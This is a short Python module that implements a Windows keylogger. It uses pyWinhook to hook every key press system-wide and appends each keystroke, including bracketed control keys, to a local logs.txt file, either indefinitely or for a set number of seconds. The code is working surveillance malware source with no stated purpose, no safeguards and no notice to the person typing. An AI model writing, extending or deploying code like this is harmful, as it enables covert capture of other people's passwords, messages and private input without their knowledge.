import pythoncom
import pyWinhook
import time

_logs_file = 'logs.txt'


def _convert_to_char(event: pyWinhook.KeyboardEvent):
    ascii_code = int(event.Ascii)
    if 0 <= ascii_code <= 31 or ascii_code == 127:
        return '[' + event.Key + ']'
    return chr(ascii_code)


def _log_key(event: pyWinhook.KeyboardEvent):
    key = _convert_to_char(event)
    output_file = open(_logs_file, 'a+')
    output_file.write(key)
    output_file.close()
    return True


def intercept_keys_infinitely():
    hook_manager = pyWinhook.HookManager()
    hook_manager.KeyDown = _log_key
    hook_manager.HookKeyboard()
    pythoncom.PumpMessages()


def intercept_keys(seconds):
    hook_manager = pyWinhook.HookManager()
    hook_manager.KeyDown = _log_key
    hook_manager.HookKeyboard()
    start_time = time.time()
    current_time = time.time()
    while current_time - start_time < seconds:
        pythoncom.PumpWaitingMessages()
        current_time = time.time()
